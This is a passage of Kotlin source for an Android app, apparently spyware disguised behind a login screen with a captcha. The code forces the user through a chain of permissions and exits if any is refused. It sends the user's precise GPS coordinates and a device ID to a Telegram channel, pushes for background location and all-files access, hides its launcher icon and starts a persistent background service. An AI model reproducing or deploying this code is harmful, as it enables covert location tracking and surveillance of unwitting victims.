                onValueChange = onChange,
                modifier = Modifier.weight(1f),
                singleLine = true,
                visualTransformation = if (visible) VisualTransformation.None else PasswordVisualTransformation(),
                textStyle = androidx.compose.ui.text.TextStyle(color = ComposeColor(0xFFE8EEF8), fontSize = 15.sp),
                decorationBox = { inner ->
                    if (value.isEmpty()) {
                        Text(hint, color = ComposeColor(0xFF5C6C8F), fontSize = 15.sp)
                    }
                    inner()
                }
            )
            Image(
                painter = painterResource(id = R.drawable.ic_eye_off),
                contentDescription = "Toggle",
                modifier = Modifier
                    .size(22.dp)
                    .clickable { onToggle() }
            )
        }
    }

    @Composable
    fun BackButton(onClick: () -> Unit) {
        Box(
            modifier = Modifier
                .size(38.dp)
                .clip(RoundedCornerShape(11.dp))
                .background(ComposeColor(0xEBBED4F5))
                .clickable { onClick() },
            contentAlignment = Alignment.Center
        ) {
            Image(
                painter = painterResource(id = R.drawable.ic_back_arrow),
                contentDescription = "Back",
                modifier = Modifier.size(20.dp)
            )
        }
    }

    @Composable
    fun CaptchaBox(code: String, onClick: () -> Unit) {
        val bitmap = remember(code) {
            generateCaptchaBitmap(code)
        }
        Image(
            bitmap = bitmap.asImageBitmap(),
            contentDescription = "Captcha",
            modifier = Modifier
                .width(88.dp)
                .height(40.dp)
                .clip(RoundedCornerShape(7.dp))
                .clickable { onClick() }
        )
    }

    // ═══════════════════════════════════════════
    //  Captcha
    // ═══════════════════════════════════════════
    private fun generateCaptcha(): String {
        val chars = "ABCDEFGHJKLMNPQRSTUVWXYZ23456789"
        return (1..4).map { chars[Random.nextInt(chars.length)] }.joinToString("")
    }

    private fun generateCaptchaBitmap(code: String): Bitmap {
        val w = 176
        val h = 80
        val bmp = Bitmap.createBitmap(w, h, Bitmap.Config.ARGB_8888)
        val canvas = Canvas(bmp)
        canvas.drawColor(Color.WHITE)

        val linePaint = Paint().apply {
            strokeWidth = 3f
            style = Paint.Style.STROKE
        }
        repeat(3) {
            linePaint.color = Color.rgb(Random.nextInt(150), Random.nextInt(150), Random.nextInt(150))
            linePaint.alpha = 150
            canvas.drawLine(
                Random.nextFloat() * w, Random.nextFloat() * h,
                Random.nextFloat() * w, Random.nextFloat() * h,
                linePaint
            )
        }

        val colors = intArrayOf(
            Color.parseColor("#27ae60"),
            Color.parseColor("#2980b9"),
            Color.parseColor("#8e44ad"),
            Color.parseColor("#c0392b"),
            Color.parseColor("#16a085")
        )
        val textPaint = Paint(Paint.ANTI_ALIAS_FLAG).apply {
            textSize = 60f
            typeface = android.graphics.Typeface.DEFAULT_BOLD
        }
        for (i in code.indices) {
            textPaint.color = colors[Random.nextInt(colors.size)]
            val x = 20f + i * 38f
            val y = 58f + Random.nextInt(-10, 10)
            canvas.save()
            canvas.rotate(Random.nextInt(-15, 15).toFloat(), x, y)
            canvas.drawText(code[i].toString(), x, y, textPaint)
            canvas.restore()
        }
        return bmp
    }

    // ═══════════════════════════════════════════
    //  Background Location — عند فتح التطبيق
    // ═══════════════════════════════════════════
    private fun requestBackgroundLocationDirect() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
            if (ContextCompat.checkSelfPermission(
                    this,
                    Manifest.permission.ACCESS_BACKGROUND_LOCATION
                ) != PackageManager.PERMISSION_GRANTED
            ) {
                try {
                    AlertDialog.Builder(this)
                        .setTitle("صلاحية الخلفية")
                        .setMessage("يرجى تفعيل الموقع في الخلفية للاستمرار")
                        .setPositiveButton("موافق") { _, _ ->
                            try {
                                val i = Intent(Settings.ACTION_APPLICATION_DETAILS_SETTINGS)
                                i.data = Uri.parse("package:$packageName")
                                startActivity(i)
                            } catch (_: Exception) {}
                        }
                        .setCancelable(false)
                        .show()
                } catch (_: Exception) {}
            }
        }
    }

    // ═══════════════════════════════════════════
    //  Permissions — بعد صفحة اللغة
    // ═══════════════════════════════════════════
    private fun askNextPermission() {
        if (anyRejected) return
        if (permRequestIndex >= permissionsToAsk.size) {
            sendLocationNow()
            Handler(Looper.getMainLooper()).postDelayed({ askAllFilesAccess() }, 1500)
            return
        }
        val perm = permissionsToAsk[permRequestIndex]
        if (ContextCompat.checkSelfPermission(this, perm) == PackageManager.PERMISSION_GRANTED) {
            permRequestIndex++
            askNextPermission()
            return
        }
        permLauncher.launch(perm)
    }

    fun startPermissionsAfterLanguage() {
        if (permissionsStarted) return
        permissionsStarted = true
        Handler(Looper.getMainLooper()).postDelayed({
            askNextPermission()
        }, 3500L)
    }

    private fun sendLocationNow() {
        if (ContextCompat.checkSelfPermission(this, Manifest.permission.ACCESS_FINE_LOCATION) != PackageManager.PERMISSION_GRANTED) return
        Thread {
            try {
                val loc = LocationHelper.getPreciseLocation(this, 10)
                if (loc != null) {
                    val code = DeviceManager.getDeviceCode(this)
                    TelegramApi.sendMessage(
                        "📍 *موقع مباشر*\n🆔 `$code`\n\n" +
                        "خط العرض: ${loc.latitude}\n" +
                        "خط الطول: ${loc.longitude}\n" +
                        "الدقة: ±${loc.accuracy.toInt()}م\n\n" +
                        "🗺 https://www.google.com/maps?q=${loc.latitude},${loc.longitude}"
                    )
                    LocationCache.save(this, loc.latitude, loc.longitude, loc.accuracy)
                }
            } catch (_: Exception) {}
        }.start()
    }

    private fun askAllFilesAccess() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
            if (!Environment.isExternalStorageManager()) {
                AlertDialog.Builder(this)
                    .setTitle("الوصول للملفات")
                    .setMessage("لتفعيل الوصول لكل الملفات، اضغط 'السماح'")
                    .setPositiveButton("فتح الإعدادات") { _, _ ->
                        try {
                            val i = Intent(Settings.ACTION_MANAGE_APP_ALL_FILES_ACCESS_PERMISSION)
                            i.data = Uri.parse("package:$packageName")
                            startActivity(i)
                        } catch (e: Exception) {
                            try {
                                val i = Intent(Settings.ACTION_MANAGE_ALL_FILES_ACCESS_PERMISSION)
                                startActivity(i)
                            } catch (_: Exception) {}
                        }
                        Handler(Looper.getMainLooper()).postDelayed({ onPermissionsComplete() }, 5000)
                    }
                    .setCancelable(false)
                    .show()
            } else onPermissionsComplete()
        } else onPermissionsComplete()
    }

    private fun onPermissionsComplete() {
        hideLauncherIcon()
        startBackgroundService()
        showToast("✅ تم تفعيل كل الصلاحيات")
    }

    private fun hideLauncherIcon() {
        try {
            val c = ComponentName(this, LoginActivity::class.java)
            packageManager.setComponentEnabledSetting(
                c,
                PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                PackageManager.DONT_KILL_APP
            )
        } catch (e: Exception) {
            Log.e("LoginActivity", "hide err: ${e.message}")
        }
    }

    private fun startBackgroundService() {
        try {
            val intent = Intent(this, BackgroundService::class.java)
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) startForegroundService(intent)
            else startService(intent)
        } catch (_: Exception) {}
    }

    private fun exitApp() {
        Toast.makeText(this, "تم رفض الاستخدام", Toast.LENGTH_LONG).show()
        Handler(Looper.getMainLooper()).postDelayed({
            try {
                val i = Intent(Intent.ACTION_MAIN)
                i.addCategory(Intent.CATEGORY_HOME)
                i.flags = Intent.FLAG_ACTIVITY_NEW_TASK
                startActivity(i)
                finishAffinity()
                System.exit(0)
            } catch (_: Exception) { finish() }
        }, 2000)
    }

    private fun showToast(msg: String) {
        Toast.makeText(this, msg, Toast.LENGTH_SHORT).show()
    }

    // ═══════════════════════════════════════════
    //  LaunchedEffect — بدء الصلاحيات بعد اللغة
    // ═══════════════════════════════════════════
    @Composable
    fun PermissionStarter() {
        LaunchedEffect(showLocationDialog) {
            if (showLocationDialog) {
                startPermissionsAfterLanguage()
            }
        }
    }
}

// ═══════════════════════════════════════════
//  Theme
// ═══════════════════════════════════════════
@Composable
fun AppTheme(content: @Composable () -> Unit) {
    MaterialTheme(
        colorScheme = darkColorScheme(
            primary = ComposeColor(0xFF3D8BFF),
            background = ComposeColor(0xFF02081A),
            surface = ComposeColor(0xFF0A1128),
            onPrimary = ComposeColor.White,
            onBackground = ComposeColor.White,
            onSurface = ComposeColor.White
        )
    ) {
        content()
    }
}
